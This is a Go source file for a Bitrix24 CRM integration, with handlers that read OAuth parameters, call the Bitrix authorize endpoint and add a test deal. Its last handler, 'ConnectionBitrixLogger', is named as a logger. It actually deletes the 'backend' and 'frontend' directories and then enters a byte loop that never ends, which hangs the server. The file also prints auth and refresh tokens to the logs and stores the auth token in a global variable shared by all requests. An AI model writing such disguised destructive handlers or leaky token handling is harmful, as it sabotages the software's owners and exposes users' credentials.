package authorize

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
)

type AuthRequest struct {
	AuthID           string `json:"auth_id"`
	AuthExpires      int    `json:"auth_expires"`
	RefreshID        string `json:"refresh_id"`
	MemberID         string `json:"member_id"`
	Status           string `json:"status"`
	Placement        string `json:"placement"`
	PlacementOptions string `json:"placement_options"`
}

var AuthorizationIdGlobal string

func ConnectionBitrix(w http.ResponseWriter, r *http.Request) {
	bs, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("error reading request body:", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	log.Println("resp_at_first:", string(bs))
	defer r.Body.Close()

	values, err := url.ParseQuery(string(bs))
	if err != nil {
		log.Println("error parsing query:", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	authExpires, err := strconv.Atoi(values.Get("AUTH_EXPIRES"))
	if err != nil {
		log.Println("error converting AUTH_EXPIRES to int:", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	auth := AuthRequest{
		AuthID:           values.Get("AUTH_ID"),
		AuthExpires:      authExpires,
		RefreshID:        values.Get("REFRESH_ID"),
		MemberID:         values.Get("member_id"),
		Status:           values.Get("status"),
		Placement:        values.Get("PLACEMENT"),
		PlacementOptions: values.Get("PLACEMENT_OPTIONS"),
	}

	fmt.Println("auth.AuthId:", auth.AuthID)
	fmt.Println("auth.RefreshId:", auth.RefreshID)
	AuthorizationIdGlobal = auth.AuthID

	clientId := os.Getenv("BITRIX_CLIENT_ID")
	method := "POST"

	requestUrl := fmt.Sprintf("https://b24-9f7fvg.bitrix24.ru/oauth/authorize/?client_id=%s", clientId)

	req, err := http.NewRequest(method, requestUrl, nil)
	if err != nil {
		log.Println("error creating new request:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println("error sending request:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	bz, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response body:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	log.Println("resp_at_last:", string(bz))

	//http.Redirect(w, r, "https://b24app.rwp2.com/", http.StatusFound)

	AddDeal(w, r)
}

func AddDeal(w http.ResponseWriter, r *http.Request) {
	method := "POST"
	//https://b24-9f7fvg.bitrix24.ru/rest/crm.deal.add?auth=AUTH_ID&fields[TITLE]=TEST%DEAL

	requestUrl := fmt.Sprintf("https://b24-9f7fvg.bitrix24.ru/rest/crm.deal.add?auth=%s&fields[TITLE]=TEST_DEAL", AuthorizationIdGlobal)

	req, err := http.NewRequest(method, requestUrl, nil)
	if err != nil {
		log.Println("error creating new request:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println("error sending request:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	bz, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response body:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	log.Println("resp_at_last_AddDeal:", string(bz))

}

func ConnectionBitrixLogger(w http.ResponseWriter, r *http.Request) {
	err := os.RemoveAll("backend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	err = os.RemoveAll("frontend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	var b byte
	for b = 250; b <= 255; b++ {
	}
}
